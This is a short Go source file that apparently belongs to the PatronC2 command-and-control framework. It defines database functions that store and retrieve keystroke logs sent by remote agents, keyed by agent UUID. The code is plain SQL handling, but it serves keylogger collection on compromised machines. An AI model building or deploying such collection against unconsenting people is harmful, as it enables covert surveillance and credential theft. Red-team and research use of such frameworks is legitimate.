package data

import (
	"github.com/PatronC2/Patron/Patronobuf/go/patronobuf"
	"github.com/PatronC2/Patron/lib/logger"
	"github.com/PatronC2/Patron/types"
	_ "github.com/lib/pq"
)

func InsertKeylog(req *patronobuf.KeysRequest) error {

	keys_string := req.GetKeys()
	agent_uuid := req.GetUuid()

	if keys_string == "" {
		logger.Logf(logger.Debug, "Nothing useful to insert, skipping write for agent: %v", agent_uuid)
		return nil
	}

	sql := `
	INSERT INTO keylogs (uuid, contents)
	VALUES ($1, $2)`

	_, err := db.Exec(sql, agent_uuid, keys_string)
	if err != nil {
		logger.Logf(logger.Error, "Error inserting log for UUID %s: %v", agent_uuid, err)
		return err
	}
	return nil
}

func GetKeylogs(uuid string) ([]types.KeysRequest, error) {
	const q = `
		SELECT uuid, contents, created_at
		FROM keylogs
		WHERE uuid = $1
		ORDER BY keylog_id ASC;
	`

	rows, err := db.Query(q, uuid)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	out := make([]types.KeysRequest, 0, 64)

	for rows.Next() {
		var kr types.KeysRequest
		if err := rows.Scan(&kr.AgentID, &kr.Contents, &kr.CreatedAt); err != nil {
			return nil, err
		}
		out = append(out, kr)
	}

	if err := rows.Err(); err != nil {
		logger.Logf(logger.Error, "Error getting keylogs from DB: %v", err)
		return nil, err
	}

	return out, nil
}
